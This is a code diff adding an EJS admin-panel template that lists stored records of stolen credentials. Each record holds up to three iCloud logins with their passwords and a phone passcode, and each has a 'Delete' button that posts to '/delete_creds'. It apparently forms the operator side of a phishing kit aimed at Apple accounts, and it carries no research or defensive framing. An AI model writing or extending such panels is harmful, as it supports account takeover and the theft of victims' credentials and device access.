@@ -1,0 +1,117 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin</title>
+    <link rel="stylesheet" href="/css/home.css">
+</head>
+<body>
+    <div class="admin-contents">
+        <center><h1>Panel</h1></center>
+        <div class="fields-container main">
+            <p class="title">Login1</p>
+            <p class="title">Login2</p>
+            <p class="title">Login3</p>
+            <p class="title">phone-password</p>
+        </div>
+        <% const infoSize = infos_ejs.length %>
+        <% if(infoSize >= 2) {%>
+            <% for(let i=0; i<2; i++) {%>
+                <div class="fields-container sections">
+                    <div class="fields">
+                        <p><%= infos_ejs[i].fistIcloud %></p>
+                        <p><%= infos_ejs[i].firstPassword %></p>
+                    </div>
+                    <div class="fields">
+                        <p><%= infos_ejs[i].secondIcloud %></p>
+                        <p><%= infos_ejs[i].secondPassword %></p>
+                    </div>
+                    <div class="fields">
+                        <p><%= infos_ejs[i].thirdIcloud %></p>
+                        <p><%= infos_ejs[i].thirdPassowrd %></p>
+                    </div>
+                    <div class="fields">
+                        <p><%= infos_ejs[i].phonePassword %></p>
+                    </div>
+                    <form action="/delete_creds" method="post">
+                        <button class="delete" type="submit" name="icloud_id" value="<%= infos_ejs[i]._id %>">Delete</button>
+                    </form>
+                </div>       
+                <% } %>
+                <div class="view-mores hidden">
+                    <% for(let i=2; i<infos_ejs.length; i++) {%>
+                    <div class="fields-container sections">
+                        <div class="fields">
+                            <p><%= infos_ejs[i].fistIcloud %></p>
+                            <p><%= infos_ejs[i].firstPassword %></p>
+                        </div>
+                        <div class="fields">
+                            <p><%= infos_ejs[i].secondIcloud %></p>
+                            <p><%= infos_ejs[i].secondPassword %></p>
+                        </div>
+                        <div class="fields">
+                            <p><%= infos_ejs[i].phonePassword %></p>
+                            <p><%= infos_ejs[i].thirdPassowrd %></p>
+                        </div>
+                        <div class="fields">
+                            <p><%= infos_ejs[i].thirdIcloud %></p>
+                        </div>
+                        <form action="/delete_creds" method="post">
+                            <button class="delete" type="submit" name="icloud_id" value="<%= infos_ejs[i]._id %>">Delete</button>
+                        </form>
+                    </div>       
+                    <% } %>
+                </div>
+                <div class="btn">
+                    <button class="view-more">View More</button>
+                </div> 
+        <% } else {%>
+            <% for(let i=0; i<infos_ejs.length; i++) {%>
+                <div class="fields-container sections">
+                    <div class="fields">
+                        <p><%= infos_ejs[i].fistIcloud %></p>
+                        <p><%= infos_ejs[i].firstPassword %></p>
+                    </div>
+                    <div class="fields">
+                        <p><%= infos_ejs[i].secondIcloud %></p>
+                        <p><%= infos_ejs[i].secondPassword %></p>
+                    </div>
+                    <div class="fields">
+                        <p><%= infos_ejs[i].thirdIcloud %></p>
+                        <p><%= infos_ejs[i].thirdPassowrd %></p>
+                    </div>
+                    <div class="fields">
+                        <p><%= infos_ejs[i].phonePassword %></p>
+                    </div>
+                    <form action="/delete_creds" method="post">
+                        <button class="delete" type="submit" name="icloud_id" value="<%= infos_ejs[i]._id %>">Delete</button>
+                    </form>
+                </div>       
+                <% } %>
+        <% } %>
+
+    </div>
+    
+    <!-- JavaScript -->
+    <script>
+        const viewMore = document.querySelector('.view-more')
+        const viewMores = document.querySelector('.view-mores')
+        let opened = true
+
+        viewMore.addEventListener('click', () => {
+            if(opened) {
+                viewMores.classList.remove('hidden')
+                viewMore.innerHTML = "View Less"
+            }else{
+                viewMores.classList.add('hidden')
+                viewMore.innerHTML = "View More"
+
+            }
+            opened = !opened
+        })
+    </script>
+</body>
+</html>
